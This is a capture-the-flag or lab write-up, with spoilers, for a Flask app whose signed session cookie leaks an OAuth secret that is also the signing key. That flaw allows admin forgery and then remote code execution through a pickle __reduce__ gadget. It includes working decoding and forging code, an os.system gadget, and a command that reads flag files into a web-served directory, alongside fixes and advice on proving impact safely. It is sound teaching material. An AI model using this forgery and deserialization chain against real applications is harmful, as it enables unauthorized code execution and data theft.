# Full write-up — *** SPOILERS ***

Stop here if you haven't finished. This document explains not just *what* to
do but *why a hacker would think to look there*, which is the actual skill.

---

## The mindset

Three questions drive the whole lab:

1. **What state does the server create before it trusts me?**
   Sign-in flows are the richest source. They must track something across a
   redirect to a third party, and they do it before you have an account.
2. **Where does that state live, and who can read it?**
   "Signed" and "encrypted" are different words. People conflate them.
3. **What does the server do with it when it comes back?**
   Anything that reconstructs a *structure* from bytes — deserialization,
   templating, SQL — is a place where data can become behaviour.

A bug like this is three ordinary mistakes stacked. None is exotic. The skill
is noticing the stack.

---

## Stage 1 — Recon

### The observation

`GET /auth/login` sets `nimbus_session` and redirects to the IdP. No account
needed. The cookie is ~600 bytes.

That number is the whole finding. A CSRF token plus a return URL is well
under 100 bytes. Something an order of magnitude larger means the app is
storing *structure* in the cookie. Always eyeball cookie size.

### Decoding

Flask's cookie format is `payload.timestamp.signature`, base64url each, and a
leading `.` means the payload is zlib-compressed (itsdangerous compresses
when it helps). Nothing is encrypted — the signature only proves the server
wrote it, and it says nothing about confidentiality.

```python
import base64, json, zlib
raw = cookie.lstrip(".").split(".")[0]
data = base64.urlsafe_b64decode(raw + "=" * (-len(raw) % 4))
if cookie.startswith("."):
    data = zlib.decompress(data)
print(json.loads(data))
```

You get:

```json
{"csrf_token": "…", "oauth_flows": {"…": {" b": "gASV…"}}}
```

`{" b": …}` is Flask's tag for `bytes`. Decode it and the first bytes are
`\x80\x04\x95` — a **pickle**, protocol 4.

### Reading a pickle without running it

This matters as a working habit: `pickle.loads()` on anything you didn't
create executes code *on your machine*. Attacker data goes through
`pickletools`, which walks opcodes without executing:

```python
import pickletools
pickletools.dis(blob)
```

Inside: an `OAuthFlow` object with `client_id`, `redirect_uri`, `scopes`,
`state`, `next_url`, a `debug_note` holding **`FLAG{recon_…}`**, and —
the real prize — **`client_secret` in plaintext**.

### Why this is already a finding

The OAuth client secret is now public to every visitor. By itself that's a
serious report: anyone can impersonate the application to the IdP.

---

## Stage 2 — The key signs the data that contains it

### The leap

You have a secret. The cookie is signed with *a* secret. Developers who
leak one credential often reused it. Test it — a 30-second check.

Don't reimplement Flask's key derivation (HMAC-SHA1, salt `cookie-session`,
via `itsdangerous`); make Flask hand you the exact serializer:

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__); app.secret_key = leaked_secret
signer = SecureCookieSessionInterface().get_signing_serializer(app)
signer.loads(server_cookie)     # no BadSignature → confirmed
```

It verifies. **The application signs its sessions with a key it ships inside
every session.** The integrity guarantee is circular and therefore worthless.

### Cashing it in

`/admin` trusts `session["user"]["role"]`. There's no server-side lookup, so
forging the session is sufficient:

```python
signer.dumps({"user": {"email": "x@y.z", "name": "you", "role": "admin"}})
```

Set it as `nimbus_session` → **`FLAG{forge_…}`**.

Worth pausing here. Privilege escalation is where most people would stop and
write the report. The next stage is the difference between "high" and
"critical."

---

## Stage 3 — Forged session → RCE

### Finding the sink

Cookie forgery is only as interesting as what consumes the cookie.
`/auth/callback` does:

```python
csrf = session.get("csrf_token")
blob = session.get("oauth_flows", {}).get(csrf)
flow = pickle.loads(blob)             # ← the sink
userinfo = flow.exchange_code(...)    # all validation happens after
```

Both the lookup key and the bytes come from the session. You control the
session. And the unpickle happens **before** the authorization code, the
`state` parameter, or anything else is validated — so none of that needs to
be correct.

The design was "safe" only under the assumption that the signature kept
clients out. Stage 2 removed the assumption.

### The gadget

Pickle isn't a data format; it's a little program that rebuilds an object.
`__reduce__` is the documented hook: return `(callable, args)` and the
unpickler calls it.

```python
import os
class Exec:
    def __reduce__(self):
        return (os.system, ("id",))
```

`pickle.dumps(Exec())` produces bytes that, when loaded, run `id`. No opcode
hand-assembly required.

### Prove it safely first

Running commands on a system you're assessing is how a finding becomes an
incident. Prove execution with something inert:

```python
class Sleep:
    def __init__(self, s): self.s = s
    def __reduce__(self): return (time.sleep, (self.s,))
```

Send `0`, `3`, `6`. If response time tracks the value, the server is
importing `time` and calling `sleep` with *your* argument. That's execution,
demonstrated, with zero side effects.

Then run the controls, so a skeptical reader can't blame a slow endpoint:

| Request | Expected |
|---|---|
| no cookie | 400, instant |
| tampered signature | 400, instant |
| valid signature, no flow entry | 400, instant |
| valid signature, `sleep(n)` | 400 after ~n seconds |

Only the last one is slow, and only in proportion to your input. That table
is what belongs in a report.

### Exfiltrating output

`os.system` output goes to the container's stdout, not the HTTP response —
the callback returns the same error page either way. You need a side channel.

The container is read-only, but the app writes its search index to
`/app/static/cache/` at startup, which is a tmpfs *and* served at
`/static/cache/`. (The changelog page mentions the pre-built index; that's
the hint.) Write there, then read it over HTTP:

```python
cmd = "(id; ls -la /; cat /flag_*.txt) > /app/static/cache/n.txt 2>&1"
```

then `GET /static/cache/n.txt` → **`FLAG{rce_…}`**.

Finding the writable, web-served directory is the realistic part. In a real
target it's uploads, a cache, or a log the app happens to expose.

---

## The chain, in one line

> Secret stored in a signed-but-readable cookie → secret turns out to be the
> signing key → forged cookie reaches a `pickle.loads()` that runs before any
> validation → unauthenticated RCE.

## Fixing it — four independent breaks

Any **one** of these stops the chain, which is what defence in depth means:

1. **Don't put secrets in client-side state.** The flow object needed a
   client ID and a redirect URI; the client *secret* never had to be there.
2. **Separate keys by purpose.** A Flask `SECRET_KEY` should be high-entropy,
   generated for that job, stored server-side, and shared with nothing.
3. **Keep flow state on the server.** Put an opaque random ID in the cookie
   and look the flow up in Redis/DB. Cookies then carry no structure to
   attack.
4. **Never unpickle data that crossed a client boundary.** Use JSON plus
   schema validation. A signature is not a substitute, because its safety
   depends entirely on key secrecy — which is precisely what failed here.

## Transferable lessons

- **Signed ≠ secret.** If you can read it, assume an attacker read it too.
- **Oversized opaque blobs are a smell.** Measure cookies, tokens, hidden
  form fields.
- **Credential reuse is the most common chain-maker.** Any leaked secret
  should be tested against every other place a secret is used.
- **Deserialization = code execution** for pickle, and often for Java,
  PHP, Ruby, and .NET equivalents. Find the sink, then find who feeds it.
- **Order of operations is a vulnerability class.** "We validate the
  request" means nothing if the dangerous work happens first.
- **Demonstrate impact without causing it.** Timing proofs, DNS callbacks,
  and benign file reads make a report credible and keep you in scope.
